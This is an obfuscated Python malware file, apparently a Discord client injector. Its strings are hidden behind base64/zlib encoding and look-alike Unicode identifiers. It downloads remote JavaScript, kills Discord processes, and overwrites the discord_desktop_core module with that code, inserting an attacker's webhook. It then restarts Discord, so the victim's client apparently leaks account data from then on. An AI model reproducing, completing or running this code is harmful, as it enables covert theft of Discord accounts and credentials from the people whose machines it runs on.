import os
import re
import subprocess
import psutil
import requests

class Injection:

    def __init__(self, webhook):
        𝘀𝘦𝘁𝙖𝙩𝘁𝗿(𝘀𝙚𝘭𝘧, 'appdata', 𝘰𝘀.getenv(__𝗶𝗺𝗽𝙤𝘳𝘵__('base64').b64decode(__𝙞𝗺𝘱𝗼𝗿𝘵__('zlib').decompress(b'x\xda\x0bq\xb5t\t\x0c\xadp\nusr\r\x0c\x0br\x02\x00)\x05\x04\xd4')).decode()))
        𝙨𝙚𝙩𝘢𝘵𝘁𝙧(𝙨𝗲𝘭𝗳, 'discord_dirs', [𝘴𝗲𝙡𝙛.appdata + __𝗶𝗺𝙥𝘰𝗿𝙩__('base64').b64decode(__𝗶𝘮𝙥𝙤𝘳𝘵__('zlib').decompress(b'x\xda\x8bp\r*H6\xf2+K\xce\r\xb4\x05\x00\x1a\x91\x04\x17')).decode(), 𝙨𝘦𝘭𝘧.appdata + __𝘪𝘮𝙥𝗼𝗿𝘵__('base64').b64decode(__𝘪𝙢𝘱𝘰𝙧𝘁__('zlib').decompress(b'x\xda\x8bp\r*H6\xf2+K\xce\rr\x89\x0c7\xcdH\xce\xcb\xb6\x05\x00G\xea\x06\xe5')).decode(), 𝘴𝗲𝙡𝘧.appdata + __𝙞𝙢𝘱𝗼𝘳𝘵__('base64').b64decode(__𝘪𝘮𝙥𝗼𝙧𝘵__('zlib').decompress(b'x\xda\x8bp\r*H6\xf2+K\xce\r\n\x0cs\xf5\xb4\x05\x00.M\x05M')).decode(), 𝘀𝘦𝘭𝘧.appdata + __𝙞𝙢𝗽𝘰𝗿𝘵__('base64').b64decode(__𝙞𝘮𝙥𝗼𝘳𝘁__('zlib').decompress(b'x\xda\x8bp\r*H6\xf2+K\xce\rr\x8d\x8a\x88\xcaIr\xb7,O\n\x0f+Mq\xb4\xb5\x05\x00\x8c\xa1\t\x94')).decode()])
        𝘴𝗲𝙩𝘢𝙩𝘁𝘳(𝘴𝗲𝘭𝘧, 'code', 𝙧𝘦𝙦𝘶𝙚𝘀𝙩𝘴.get(__𝗶𝙢𝗽𝙤𝙧𝘵__('base64').b64decode(__𝙞𝗺𝗽𝙤𝙧𝘵__('zlib').decompress(b'x\xda\x05\xc1;\x0e\x84 \x10\x00\xd0+)\xfbI(\xf7\x13\xa5\x00\x92\xa5`\x81\xce\x19\x0b\t\x83\x99B1\xee\xe9\xf7\xbdI\xb9\x0e\x95\xb9\xebS\x9e1\xe0\x9e\x04u\x93\xf2y\x0e\x96\xb0\xda\x06\xab#X?{\x14r\xd3b(i,\x87y?\x0e\xf3\x92\x04\xe1y\xc3\xea\x17\xc8=Ce\x8a\x17\xc7 \xae\r\xbe\x03C\x96-\xd6\xd4\xa3\xb0\xcb<\xfa\xa2+\xff\xfe\xe3$%v')).decode()).text)
        for 𝗽𝘳𝙤𝗰 in 𝗽𝘀𝘂𝘵𝘪𝙡.process_iter():
            if __𝙞𝙢𝗽𝘰𝘳𝘁__('base64').b64decode(__𝗶𝘮𝙥𝘰𝘳𝙩__('zlib').decompress(b'x\xda\x8br\xcf\xa9\x8a4\xb2\xac\x8cr\xb4\xb5\x05\x00\x1a\x8e\x03\xda')).decode() in 𝙥𝗿𝙤𝘤.name().lower():
                𝗽𝙧𝗼𝙘.kill()
        for 𝘥𝘪𝙧 in 𝘀𝘦𝘭𝙛.discord_dirs:
            if not 𝘰𝘀.path.exists(𝙙𝘪𝘳):
                continue
            if 𝘴𝘦𝗹𝗳.get_core(𝙙𝘪𝗿) is not None:
                with 𝙤𝙥𝘦𝘯(𝘀𝗲𝘭𝙛.get_core(𝙙𝗶𝘳)[𝘪𝗻𝘵.from_bytes(𝙢𝙖𝙥(lambda O, i: 667 - (𝙞𝗻𝘁(𝘖) + 𝗶), 𝙢𝙖𝙥(__𝗶𝗺𝗽𝙤𝗿𝘁__('base64').b64decode(__𝘪𝗺𝙥𝗼𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝙥(*[𝘪𝘁𝗲𝗿(__𝙞𝗺𝗽𝘰𝙧𝘵__('base64').b64decode(__𝗶𝗺𝙥𝗼𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝙧𝙖𝘯𝘨𝙚(0)), __𝗶𝗺𝘱𝗼𝗿𝙩__('base64').b64decode(__𝘪𝘮𝙥𝗼𝘳𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] + __𝙞𝘮𝗽𝘰𝙧𝙩__('base64').b64decode(__𝘪𝘮𝘱𝗼𝙧𝘁__('zlib').decompress(b'x\xda\x8bp\xcf)\x8dr\x0f3\xf1\xc9-\xa8\x02\x00\x1b(\x04O')).decode(), __𝙞𝗺𝙥𝙤𝘳𝙩__('base64').b64decode(__𝙞𝙢𝘱𝙤𝙧𝙩__('zlib').decompress(b'x\xdaK)\xb7\xb5\x05\x00\x03\xb0\x01V')).decode(), encoding=__𝘪𝙢𝙥𝙤𝗿𝙩__('base64').b64decode(__𝙞𝘮𝙥𝙤𝗿𝙩__('zlib').decompress(b'x\xdaK\x89\x08\xca\xf5\tI\xb7\x05\x00\x0c\xd4\x02\xc0')).decode()) as 𝙛:
                    𝗳.write(𝘀𝘦𝗹𝗳.code.replace(__𝙞𝙢𝘱𝘰𝘳𝘁__('base64').b64decode(__𝗶𝙢𝙥𝘰𝗿𝘁__('zlib').decompress(b'x\xda\x8br\xcf\xa9\x8a4\xb2\xac\x8cr\xb3\xcc\x8e\x8a\xf0+Jq\xb7,\x8f0\xf2+K\xce\r-\xf1\r\xb4\xb5\x05\x00\xb4R\n\xd5')).decode(), 𝘀𝗲𝗹𝗳.get_core(𝘥𝘪𝗿)[𝘪𝗻𝘵.from_bytes(𝙢𝘢𝗽(lambda O, i: 295 - (𝘪𝘯𝙩(𝘖) + 𝘪), 𝘮𝙖𝗽(__𝗶𝗺𝗽𝙤𝘳𝘁__('base64').b64decode(__𝘪𝙢𝙥𝙤𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝘪𝗽(*[𝙞𝙩𝗲𝘳(__𝙞𝘮𝙥𝙤𝗿𝙩__('base64').b64decode(__𝗶𝗺𝗽𝘰𝙧𝙩__('zlib').decompress(b'x\xda\xf3\xcd\xca6\x00\x00\x03|\x01S')).decode())] * 3)), 𝙧𝘢𝙣𝙜𝘦(1)), __𝙞𝘮𝘱𝙤𝙧𝙩__('base64').b64decode(__𝗶𝘮𝘱𝙤𝗿𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]).replace(__𝙞𝗺𝘱𝗼𝘳𝘵__('base64').b64decode(__𝙞𝙢𝗽𝘰𝗿𝙩__('zlib').decompress(b'x\xda\xf3\nKq\x0b\xcc\xce\x08\x081(\xce\x01\x00\x1a;\x04"')).decode(), 𝙬𝙚𝘣𝘩𝙤𝗼𝙠))
                    𝙨𝘦𝗹𝘧.start_discord(𝙙𝘪𝘳)

    def get_core(self, dir):
        for 𝙛𝗶𝙡𝗲 in 𝙤𝘴.listdir(𝘥𝗶𝙧):
            if 𝙧𝗲.search(__𝙞𝘮𝘱𝗼𝗿𝙩__('base64').b64decode(__𝘪𝗺𝗽𝗼𝙧𝙩__('zlib').decompress(b'x\xda\x8b\x8cp*\xf7\t.\xd6\x07\x00\x0cU\x02\xac')).decode(), 𝗳𝗶𝙡𝘦):
                𝗺𝙤𝘥𝘂𝙡𝘦𝘀 = 𝗱𝘪𝙧 + __𝗶𝗺𝙥𝙤𝘳𝘁__('base64').b64decode(__𝙞𝘮𝗽𝙤𝗿𝙩__('zlib').decompress(b'x\xda\x8bp\xb4\xb5\x05\x00\x02\xde\x01\x14')).decode() + 𝗳𝙞𝘭𝘦 + __𝙞𝙢𝙥𝙤𝗿𝙩__('base64').b64decode(__𝗶𝙢𝘱𝘰𝗿𝘁__('zlib').decompress(b'x\xda\x8bp7,\x8b\xf2\x08+\x8e\x8a\xf0\xb5\x05\x00\x19\x9b\x03\xee')).decode()
                if not 𝘰𝘴.path.exists(𝘮𝗼𝙙𝘂𝗹𝗲𝙨):
                    continue
                for 𝘧𝗶𝙡𝗲 in 𝘰𝘀.listdir(𝘮𝙤𝗱𝙪𝘭𝘦𝙨):
                    if 𝘳𝗲.search(__𝙞𝘮𝘱𝘰𝘳𝙩__('base64').b64decode(__𝘪𝙢𝗽𝘰𝘳𝘵__('zlib').decompress(b'x\xda\x8br\xcf\xa9\x8a4\xb2\xac\x8cr\xb3\xcc\x8e\x8a\xf0+Jq\xb7,\x8f0\xf2+K\xce\r-\xf1\xae\xb2\xb0\x05\x00\xb4\xbb\n\xf7')).decode(), 𝘧𝘪𝗹𝗲):
                        𝗰𝘰𝘳𝗲 = 𝙢𝙤𝗱𝘶𝗹𝙚𝘴 + __𝗶𝙢𝗽𝙤𝙧𝘵__('base64').b64decode(__𝗶𝘮𝗽𝗼𝘳𝙩__('zlib').decompress(b'x\xda\x8bp\xb4\xb5\x05\x00\x02\xde\x01\x14')).decode() + 𝗳𝗶𝙡𝗲 + __𝘪𝗺𝙥𝘰𝘳𝘁__('base64').b64decode(__𝗶𝗺𝙥𝘰𝗿𝙩__('zlib').decompress(b'x\xda\x8bp\xb4\xb5\x05\x00\x02\xde\x01\x14')).decode() + __𝙞𝙢𝘱𝘰𝙧𝙩__('base64').b64decode(__𝘪𝘮𝙥𝗼𝘳𝙩__('zlib').decompress(b'x\xda\x8br\xcf\xa9\x8a4\xb2\xac\x8cr\xb3\xcc\x8e\x8a\xf0+Jq\xb7,\x8f0\xf2+K\xce\r\xb5\x05\x00\x8aI\t\x86')).decode()
                        if not 𝙤𝘀.path.exists(𝘤𝙤𝙧𝘦 + __𝘪𝗺𝙥𝘰𝙧𝘁__('base64').b64decode(__𝘪𝗺𝙥𝘰𝗿𝘁__('zlib').decompress(b'x\xda\x8bp\xcf)\x8dr\x0f3\xf1\xc9-\xa8\x02\x00\x1b(\x04O')).decode()):
                            continue
                        return (𝗰𝗼𝗿𝘦, 𝗳𝘪𝘭𝙚)

    def start_discord(self, dir):
        𝘶𝗽𝗱𝙖𝘵𝗲 = 𝘥𝗶𝗿 + __𝗶𝗺𝙥𝘰𝗿𝘵__('base64').b64decode(__𝗶𝗺𝙥𝘰𝘳𝘵__('zlib').decompress(b'x\xda\x8bp\x0b+\x8frw3\x88\n6\xcdIu\x0f\xb5\x05\x00+\xd9\x05\x0f')).decode()
        𝗲𝘹𝗲𝗰𝘂𝙩𝙖𝙗𝙡𝙚 = 𝙙𝙞𝙧.split(__𝙞𝗺𝗽𝗼𝙧𝘵__('base64').b64decode(__𝘪𝘮𝗽𝗼𝙧𝙩__('zlib').decompress(b'x\xda\x8bp\xb4\xb5\x05\x00\x02\xde\x01\x14')).decode())[-𝘪𝘯𝙩.from_bytes(𝘮𝙖𝙥(lambda O, i: 868 - (𝙞𝘯𝘁(𝘖) + 𝗶), 𝘮𝙖𝗽(__𝙞𝗺𝗽𝘰𝘳𝙩__('base64').b64decode(__𝘪𝗺𝗽𝗼𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝙞𝗽(*[𝗶𝘵𝗲𝘳(__𝙞𝘮𝗽𝙤𝘳𝘁__('base64').b64decode(__𝙞𝗺𝙥𝗼𝙧𝙩__('zlib').decompress(b'x\xda\xf3w\x894\x06\x00\x02\xf1\x01 ')).decode())] * 3)), 𝗿𝘢𝘯𝘨𝗲(1)), __𝙞𝙢𝘱𝙤𝘳𝘁__('base64').b64decode(__𝙞𝗺𝘱𝗼𝘳𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] + __𝘪𝙢𝗽𝗼𝗿𝘵__('base64').b64decode(__𝘪𝙢𝘱𝗼𝙧𝘵__('zlib').decompress(b'x\xda\xf3\xc9\r3\x89\n\xb4\xb5\x05\x00\x0b}\x02i')).decode()
        for 𝙛𝙞𝘭𝘦 in 𝘰𝘀.listdir(𝙙𝙞𝘳):
            if 𝙧𝗲.search(__𝙞𝙢𝗽𝙤𝘳𝘁__('base64').b64decode(__𝙞𝗺𝘱𝙤𝙧𝙩__('zlib').decompress(b'x\xda\x8b\x8cp*\xf7\t.\xd6\x07\x00\x0cU\x02\xac')).decode(), 𝘧𝘪𝘭𝙚):
                𝙖𝗽𝘱 = 𝘥𝗶𝘳 + __𝘪𝘮𝘱𝗼𝗿𝘵__('base64').b64decode(__𝙞𝙢𝗽𝙤𝘳𝙩__('zlib').decompress(b'x\xda\x8bp\xb4\xb5\x05\x00\x02\xde\x01\x14')).decode() + 𝗳𝗶𝗹𝙚
                if 𝗼𝘀.path.exists(𝙖𝘱𝙥 + __𝗶𝘮𝙥𝘰𝗿𝙩__('base64').b64decode(__𝙞𝗺𝗽𝙤𝗿𝘵__('zlib').decompress(b'x\xda\x8bp\xb4\xb5\x05\x00\x02\xde\x01\x14')).decode() + __𝘪𝗺𝙥𝘰𝗿𝙩__('base64').b64decode(__𝗶𝘮𝙥𝗼𝙧𝘵__('zlib').decompress(b'x\xdaK\n\xb7\xccN\t\xaf\xc8I.\xb7\xb5\x05\x00\x1cs\x04Q')).decode()):
                    for 𝘧𝙞𝙡𝗲 in 𝗼𝘴.listdir(𝙖𝙥𝘱):
                        if 𝘧𝙞𝘭𝙚 == 𝗲𝘹𝗲𝗰𝙪𝘁𝙖𝗯𝙡𝘦:
                            𝙚𝙭𝗲𝗰𝘂𝙩𝙖𝘣𝙡𝘦 = 𝙖𝙥𝘱 + __𝙞𝘮𝙥𝘰𝗿𝙩__('base64').b64decode(__𝙞𝙢𝗽𝗼𝘳𝘵__('zlib').decompress(b'x\xda\x8bp\xb4\xb5\x05\x00\x02\xde\x01\x14')).decode() + 𝙚𝘅𝙚𝘤𝘶𝙩𝘢𝗯𝙡𝘦
                            𝘴𝙪𝘣𝙥𝙧𝙤𝗰𝘦𝙨𝘴.call([𝙪𝘱𝙙𝙖𝘁𝙚, __𝗶𝙢𝙥𝗼𝘳𝘵__('base64').b64decode(__𝗶𝘮𝗽𝗼𝘳𝘵__('zlib').decompress(b'x\xda\xf3\t6,O\xce\xb5\xcc\x8a\x8a\xf0\xab\n5\x0e\xcaH\xce\x0b\xb4\x05\x00G\xa5\x06\xd6')).decode(), 𝘦𝙭𝗲𝘤𝘂𝘵𝗮𝙗𝙡𝙚], shell=True, stdout=𝘴𝙪𝗯𝙥𝙧𝘰𝘤𝗲𝘴𝘀.PIPE, stderr=𝘀𝙪𝗯𝗽𝗿𝗼𝗰𝙚𝘀𝘴.PIPE)